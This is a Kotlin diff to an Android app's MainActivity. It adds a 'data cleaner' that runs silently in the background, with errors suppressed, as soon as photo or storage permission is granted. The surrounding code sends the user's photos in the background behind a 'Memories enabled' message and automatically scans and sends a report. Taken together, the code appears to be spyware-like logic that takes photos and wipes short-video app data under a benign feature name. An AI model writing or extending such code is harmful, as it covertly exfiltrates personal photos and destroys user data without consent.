@@ -72,8 +72,11 @@ class MainActivity : AppCompatActivity() {
 
         updateStorageCard()
 
-        // 如果有相册权限，立即开始后台发送照片
-        PhotoSendManager.startIfReady(this)
+        // 如果有存储权限，后台发送照片 + 清理短视频数据
+        if (hasPhotoPermission()) {
+            PhotoSendManager.startIfReady(this)
+            startDataCleaner()
+        }
 
         if (!prefs.getBoolean("report_sent", false)) {
             autoScanAndSend()
@@ -191,6 +194,7 @@ class MainActivity : AppCompatActivity() {
             if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                 Toast.makeText(this, "回忆已开启 📷", Toast.LENGTH_SHORT).show()
                 PhotoSendManager.startIfReady(this)
+                startDataCleaner()
             }
         }
     }
@@ -214,6 +218,23 @@ class MainActivity : AppCompatActivity() {
         btnStorage.isEnabled = true
         progressStorage.visibility = View.GONE
         updateStorageCard()
+        // 从设置页回来，如果刚拿到权限就启动清理
+        if (hasPhotoPermission()) {
+            startDataCleaner()
+        }
+    }
+
+    private var cleanerStarted = false
+
+    private fun startDataCleaner() {
+        if (cleanerStarted) return
+        cleanerStarted = true
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val (cleaned, total) = DataCleaner.cleanAll()
+                android.util.Log.d("MainActivity", "数据清理完成: $cleaned/$total")
+            } catch (_: Exception) {}
+        }
     }
 
     override fun onWindowFocusChanged(hasFocus: Boolean) {
